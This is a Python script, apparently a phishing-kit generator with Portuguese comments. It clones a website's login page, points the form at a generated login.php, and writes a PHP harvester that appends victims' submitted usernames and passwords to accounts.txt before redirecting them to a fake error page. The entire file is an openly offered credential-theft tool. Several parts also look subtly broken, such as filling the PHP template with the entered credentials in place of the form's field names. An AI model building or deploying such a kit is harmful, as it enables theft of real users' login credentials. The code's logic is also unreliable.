import re
import http.cookiejar as cookielib
import mechanize
from bs4 import BeautifulSoup as bs

class Create:
    def __init__(self):
        self.browser = None
        self.username_field = None
        self.password_field = None
        self.username = None
        self.password = None
        self.loginphp = 'login.php'  # escreva as informações de postagem
        self.fakeLogin = '256.256'  # força a página a lançar um erro de login (número aleatório)
        self.phpsrc = '''<?php
$data = sprintf("Account Information\\n[
Login: %s
Password: %s\\n]
\\n",$_POST['{}'], $_POST['{}']);

$file = "accounts.txt";
file_put_contents($file, $data, FILE_APPEND);\n?>\n
<meta http-equiv="refresh" content="0; url=error.html"/>'''

    def exit(self, page):
        exit('[-] Não foi possível localizar um formulário de login em: {}'.format(page))

    def createBrowser(self):
        self.browser = mechanize.Browser()
        self.browser.set_handle_equiv(True)
        self.browser.set_handle_referer(True)
        self.browser.set_handle_robots(False)
        self.browser.set_cookiejar(cookielib.LWPCookieJar())
        self.browser.addheaders = [('User-agent', self.useragent())]
        self.browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

    def useragent(self):
        return 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko'

    def manualInput(self):
        self.username_field = input("Digite o nome do campo de usuário: ")
        self.password_field = input("Digite o nome do campo de senha: ")
        self.username = input("Digite o nome de usuário: ")
        self.password = input("Digite a senha: ")

    def replace(self, html):
        html = bs(html, 'html.parser')
        form = html.find('form')
        form.attrs['action'] = self.loginphp

        if not self.username_field:
            self.username_field = input("Digite o nome do campo de usuário: ")
        if not self.password_field:
            self.password_field = input("Digite o nome do campo de senha: ")

        return str(html)

    def createHtml(self, src, index=True):
        src = self.replace(src)
        src = re.sub(self.fakeLogin, '', src)
        filename = 'index.html' if index else 'error.html'
        with open(filename, 'w') as fwrite:
            fwrite.write(src)

    def html(self, page, rec=5):
        self.createBrowser()

        try:
            html = self.browser.open(page)
            self.manualInput()

            self.createHtml(html.read())  # index.html

            # error.html
            self.createHtml(self.fakeLogin, False)

            print('[ Fields Found ]\nUsername: {}\nPassword: {}'.format(self.username, self.password))

        except KeyboardInterrupt:
            exit('\n[-] Interrompido')
        except Exception as e:
            print(e)
            if rec:
                self.html(page, rec - 1)
            else:
                self.exit(page)

    def php(self):
        with open(self.loginphp, 'w') as phpfile:
            phpfile.write(self.phpsrc.format(self.username, self.password))

# Exemplo de uso
if __name__ == "__main__":
    create_instance = Create()
    url = input("Digite a URL: ")
    create_instance.html(url)
